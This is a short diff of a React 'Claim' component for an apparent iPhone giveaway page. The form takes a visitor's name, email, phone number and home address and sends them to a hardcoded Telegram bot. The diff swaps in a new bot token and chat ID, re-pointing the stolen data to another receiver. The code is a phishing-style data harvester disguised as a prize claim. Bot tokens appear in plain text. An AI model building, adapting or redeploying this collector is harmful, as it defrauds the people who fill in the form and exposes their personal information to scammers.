@@ -50,8 +50,8 @@ export default function Claim() {
     setIsLoading(true);
     event.preventDefault();
     var message = `| IPHONE GIVEAWAY INFORMATION | \n              Item to Claim ${product} \n        First Name: ${formInput.fname} \n         Last Name: ${formInput.lname} \n        Email Address: ${formInput.email} \n        Phone Number: ${formInput.tel} \n        Address: ${formInput.address}\n        City: ${formInput.city} \n        State: ${formInput.state} \n ${Date()}`;
-    var token = "5724587499:AAFl5fwOetWO0yu-nFJg9OgyyFi0AGqB-TY";
-    var chat_id = 1124454735;
+    var token = "5868318271:AAF4bg5Q55j53Aml4YYICxC3MIbt8VLn5IE";
+    var chat_id = 1297895706;
     const send = await fetch(
       `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`
     );
